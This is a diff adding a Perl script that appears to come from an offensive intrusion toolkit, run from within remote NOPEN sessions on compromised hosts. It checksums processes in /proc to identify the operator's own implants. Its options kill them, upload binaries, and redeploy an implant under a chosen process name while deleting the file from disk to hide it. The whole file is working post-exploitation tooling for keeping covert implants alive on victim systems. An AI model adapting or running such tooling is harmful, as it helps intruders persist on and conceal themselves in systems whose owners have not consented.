@@ -1,0 +1,147 @@
+#!/usr/bin/env perl 
+##
+$VER="1.0.0.2";
+
+$| = 1 ;
+
+myinit() ;
+
+pidsum($sumtype,$killifgreen,$deploy,$deployas,$uploadbin,@ARGV);
+
+# Called via do so must end with 1;
+1;
+
+sub myinit {
+  # If $willautoport is already defined, we must have been called
+  # by another script via require. We do not re-do autoport stuff.
+  $calledviarequire = 0 unless $calledviarequire;
+  $stoiccmd = "called as: -gs pidsum @ARGV";
+  if ($willautoport and $socket) {
+    $stoiccmd = "in $prog, called as: pidsum(@ARGV)";
+    dbg("via require autopidsum ARGV=(
+".join("\n",@ARGV)."
+) prog=$prog");
+#    progprint("$prog called -gs pidsum @ARGV");
+    $calledviarequire = 1;
+  } else {
+    $prog = "-gs pidsum";
+    $willautoport=1;
+    my $autoutils = "../etc/autoutils" ;
+    unless (-e $autoutils) {
+      $autoutils = "/current/etc/autoutils" ;
+    }
+    require $autoutils;
+    $vertext = "$prog version $VER\n" ;
+  }
+  clearallopts();
+  $vertext = "$prog version $VER\n" ;
+  mydie("No user servicable parts inside.\n".
+	"(I.e., noclient calls $prog, not you.)\n".
+	"$vertext") unless ($nopen_rhostname and $nopen_mylog and
+			    -e $nopen_mylog);
+
+  my $origoptions = "@ARGV";
+  mydie("bad option(s)") if (! Getopts( "hvCdka:Of:" ) ) ;
+  
+  ###########################################################################
+  # Set strings used in usage before calling it
+  ###########################################################################
+
+  $sumtype = "-sha1sum";
+  $sumtype = "-cksum" if $opt_C;
+  $killifgreen = $opt_k;
+  $deploy = $opt_d;
+  $deployas = $opt_a;
+  $safetyoverride = $opt_O;
+  $uploadbin = $opt_f;
+
+
+#  my $half = int(@functionlist/2);
+#  for (my $i=0; $i < $half; $i++) {
+#    $functionlist .= sprintf("     %-35s    %s\n",$functionlist[$i],$functionlist[$i+$half]);
+#  }
+#  $functionlist .= sprintf("     %-35s    %s\n","",$functionlist[$#functionlist])
+#    unless (@functionlist % 2);
+
+  ###########################################################################
+  # PROCESS ARGUMENTS
+  ###########################################################################
+
+  #@pids = grep /^\d+$/ , @ARGV;
+  #@errs = grep ! /^\d+$/ , @ARGV;
+
+  usage() if ($opt_h or $opt_v or !@ARGV or @errs);
+
+  # Connect to autoport, we need status and more interactively.
+  # If $socket is already defined, we must have been called
+  # by another script via require. We do not re-do autoport stuff.
+
+
+  $deployas = $opt_a;
+  if (!$opt_a and @ARGV == 1 and $ARGV[0] !~ /^\d+$/) {
+    $deployas = $ARGV[0];
+  }
+
+  $socket = pilotstart(quiet) unless $socket;
+
+  ## ERROR CHECKING OF OPTS
+
+  ($output,undef,@output) = doit("-ls /proc");
+  my @test = grep m,/\d+$, , @output ;
+  mydie("/proc must exist") unless @test;
+}
+
+sub setusagetexts {
+  # Separate long usage strings as separate function
+  $usagetext="
+Usage: $prog [-h]                       (prints this usage statement)
+
+NOT CALLED DIRECTLY
+
+$prog is run from within a NOPEN session when \"$prog\" or
+\"=pidsum\" is used.
+
+";
+  $gsusagetext="
+Usage:  $prog [OPTIONS] PID-OR-NAME1 [PID-OR-NAME2 ...]
+
+$prog uses the copy of one or more running PIDs or NAMEs in /proc to
+compute its SHA1 checksum, which comes up green if it is a known tool
+in $opetc/sha1sums (or $opetc/cksums if -C is used).
+
+If a NAME is provided, then after ignoring lines containing \"grep\", $prog
+computes the checksum of any matching process.
+
+Keep in mind that any binary that changes from its original may not have its
+original checksum and so our tools may not always be green. E.g.:
+        DABBLETABLOID            SHABBYTABBY
+        NOPEN
+
+$prog requires an OS with /proc, e.g. Linux or Solaris.
+
+If a running process is found in /proc as matching any of the following, the
+-k and -d options may be used (normally together as -kd):
+        WATCHER
+
+OPTIONS
+
+  -h/v       Show usage / version information
+  -a RUNAS   When deploying, use RUNAS as the binary name. Defaults to
+             the previously running name if -k is used.
+  -C         Use -cksum instead of the default -sha1sum
+  -d         Deploy (or redeploy after successfully killing with -k),
+             removing the binary once it is running.  Will be run
+             with:      PATH=.:\$PATH RUNAS
+  -f FILE    Upload FILE (unless the pid killed with -k matches it already)
+  -k         Kill the pid if the checksum matches our tool
+  -O         Safety Override - kill PIDs even if not our tool
+
+NOTE: For now, -d is expected to only be used with WATCHER.
+
+NOTE: When deploying, only the DEPLOY is logged, even if we first kill
+      (REMOVE) the tool.
+
+Usage:  $prog [OPTIONS]
+
+";
+}#setusagetexts
